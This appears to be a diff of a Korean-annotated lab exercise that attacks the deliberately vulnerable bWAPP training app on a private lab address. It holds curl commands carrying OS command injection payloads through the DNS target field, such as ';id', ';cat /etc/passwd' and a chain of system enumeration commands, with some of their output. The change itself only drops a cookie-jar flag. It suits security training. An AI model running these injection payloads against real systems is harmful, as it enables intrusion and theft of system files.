@@ -68,7 +68,6 @@
 # DNS Target 값에 127.0.0.1;id 전달
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      -X POST \
      -d "target=127.0.0.1;id&form=submit" \
      "http://192.168.0.20/bWAPP/commandi.php" | grep -i -A 10 "<p align=\"left\">"
@@ -97,7 +96,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 # 운영체제 민감 파일 탈취 (cat /etc/passwd)
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      -X POST \
      -d "target=127.0.0.1;cat /etc/passwd&form=submit" \
      "http://192.168.0.20/bWAPP/commandi.php" | grep -i -A 30 "<p align=\"left\">" | head -n 15
@@ -123,7 +121,6 @@ www-data:x:33:33:www-data:/var/www:/bin/sh
 # 다중 명령어 실행 (uname -a; id; netstat -tulpn; pwd)
 curl -s \
      -b /home/kali/docker_exam/bwapp_cookie.txt \
-     -c /home/kali/docker_exam/bwapp_cookie.txt \
      -X POST \
      -d "target=127.0.0.1;uname -a;id;netstat -tulpn;pwd&form=submit" \
      "http://192.168.0.20/bWAPP/commandi.php" | grep -i -A 30 "<p align=\"left\">"
